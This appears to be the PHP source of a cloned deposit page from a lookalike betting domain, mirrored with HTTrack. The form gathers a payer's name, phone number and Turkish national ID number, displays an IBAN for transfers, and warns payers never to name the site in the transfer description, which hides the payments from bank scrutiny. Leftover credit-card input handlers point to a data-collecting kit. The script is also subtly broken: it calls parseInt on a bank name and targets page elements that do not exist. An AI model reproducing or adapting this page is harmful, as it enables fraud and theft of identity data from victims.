<?php
include '../inc/config.php';
$query = $db -> query("SELECT * from banks");
?>
<html lang="tr">

<!-- Mirrored from wwwjojobet633.com/odeme/banka.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 14 Oct 2022 18:31:32 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="utf-8">
<meta name="viewport" content="initial-scale=1, maximum-scale=1">
<title>Banka Yatır</title>
<link rel="stylesheet" href="o-dosya/bootstrap.min.css">
<link rel="stylesheet" href="o-dosya/ionicons.min.css">
<link rel="stylesheet" href="o-dosya/style.css">
<link rel="stylesheet" href="o-dosya/swal2.css">
<script type="text/javascript" src="o-dosya/jquery.min.js"></script>
</head>
<body>
<div class="pt-sm-0 pb-sm-0">
<div id="app" class="case">
<div class="card payment-card">
<div class="card-header font-weight-bolder">
<a href="index" class="text-dark pr-2">
< </a>Banka<span class="font-weight-normal ml-1">ile yatırım yap</span>
</div>
<form id="form" action="javascript:;" onsubmit="setPayment('havale')" method="post">
<div class="card-body">
<div class="alert alert-warning" role="alert">
Mobil Bankacılık Üzerinden Ekranda Bulunan Güncel Banka IBAN Bilgilerimize Yatırımınızı Yapabilirsiniz Yatırım Sonrası Ödeme Bildirim Formunuzu Doldurunuz
</div>
<div class="alert alert-danger" role="alert">
UYARI!!! Ödeme Yaparken Açıklama Kısmına Kesinlikle Site İsmi Yazmayınız. Kullanıcı Adınızı Yazabilir Veya Boş Bırakabilirsiniz.
</div>
<form method="post" action="javascript:;" onsubmit="setPayment('havale')">
<div class="row flex-column-reverse flex-sm-row">
<div class="col-12 col-sm-7">
<label>Banka Seçiniz</label>
<div class="input-group mb-3">
<select name="bank_id" onchange="checkBank()" class="form-control">
              <option value="" selected disabled>Banka seçiniz</option>
              <?php while ($row = $query -> fetch_assoc()) { ?>
                <option value="<?=$row['name']?>" style="text-transform: capitalize;"><?=$row['name']?></option>
              <?php } ?>
            </select>
</div>
<div class="d-flex align-items-center mb-3 pt-2">
<input type="hidden" name="islem" value="banka">

</div>
<label>Ad Soyad</label>
<div class="input-group mb-3">
<input type="text" name="full_name" class="form-control" required="">
</div>
<label>Transfer Saati</label>
<div class="input-group mb-3">
<input type="text" name="transfer_time" class="form-control" value="12:18" placeholder="12:18">
</div>
<label>Telefon Numaranız</label>
<div class="input-group mb-3">
<input type="text" name="sender_phone" class="form-control" required="">
</div>
<label>TC Kimlik Numaranız</label>
<div class="input-group mb-3">
<input type="text" name="identity" class="form-control" required="">
</div>
<label>Müşteri notu</label>
<div class="input-group mb-3">
<input type="text" name="customer_note" class="form-control">
</div>
<label>Tutar</label>
<div class="input-group mb-3">
<input type="text" name="amount" onkeyup="numExp()" class="form-control" placeholder="0.00">
<div class="input-group-append">
<span class="input-group-text">TRY</span>
</div>
</div>
</div>
<div class="col-12 col-sm-5">
<ul class="list-group mb-4 d-none" id="bank-info">
<li class="list-group-item list-group-item-info px-3">
<span>Banka Bilgileri <p id="banka"></p></span>
</li>
<li class="list-group-item list-group-item-info px-3">
<strong>Hesap Sahibi</strong>
<p class="mb-0 mt-1" id="account-holder"></p>
</li>

<li class="list-group-item list-group-item-info px-3">
<strong>Iban</strong>
<p class="mb-0 mt-1" id="iban"></p>
</li>
</ul>
</div>
</div>
</div>
<div class="card-footer">
<div class="d-flex flex-sm-row flex-row-reverse">
<button type="submit" class="btn btn-success flex-fill mr-0 mr-sm-2" name="ode">Yatırımı
Gerçekleştirdim</button>
<a href="odeme.html" class="btn btn-danger mr-2 mr-sm-0">Vazgeç</a>
</div>
</div>
</form>
</div>
</div>
<div class="case py-4">
<div class="text-center text-black-50"><i class="ion-locked mr-2"></i>Secure 256-bit TLS-encryption</div>
</div>
</div>
<script type="text/javascript" src="o-dosya/sweetalert2.all.min.js"></script>
<script type="text/javascript" src="o-dosya/script.js"></script>
<script>
        function hata_goster(type, text) {
            if (type == "success") {
                Swal.fire({
                    position: "top-end",
                    type: "success",
                    title: text,
                    showConfirmButton: !1,
                    timer: 1500
                })
            } else {
                Swal.fire({
                    title: "Bazı hatalar mevcut!",
                    html: text,
                    type: "error",
                    confirmButtonColor: "#556ee6"
                })
            }
        }
    </script>
<script>
    $(".cc-exp").keypress(function(event) {
        var dInput = this.value;
        if (event.which != 8 && isNaN(String.fromCharCode(event.which))) {
            event.preventDefault();
        }
        //console.log(dInput.length)
        if (dInput.length == 2) {
            this.value = dInput + "/";
        }
    })

    $(".cc-exp").keypress(function(event) {
        var dInput = this.value;
        if (event.which != 8 && isNaN(String.fromCharCode(event.which))) {
            event.preventDefault();
        }
    })

    $(".cc-number").keypress(function(event) {
        var dInput = this.value;
        if (event.which != 8 && isNaN(String.fromCharCode(event.which))) {
            event.preventDefault();
        }
    })

	

</script>
<script>
  function checkBank(){
  const data = new FormData();
  data.append("id", parseInt(event.target.value));
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "/request.php?q=get-bank");
  xhr.onload = function(){
    if (this.status == 200) {
      let response = JSON.parse(this.responseText);
      document.querySelector("#bank-info").classList.remove("d-none");
      document.querySelector("#account-holder").innerText = response.account_holder;
      document.querySelector("#account-number").innerText = response.account_number;
      document.querySelector("#branch-code").innerText = response.branch_code;
      document.querySelector("#iban").innerText = response.iban;
    }
  }
  xhr.send(data);
}

</script>
</body>

<!-- Mirrored from wwwjojobet633.com/odeme/banka.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 14 Oct 2022 18:31:32 GMT -->
</html>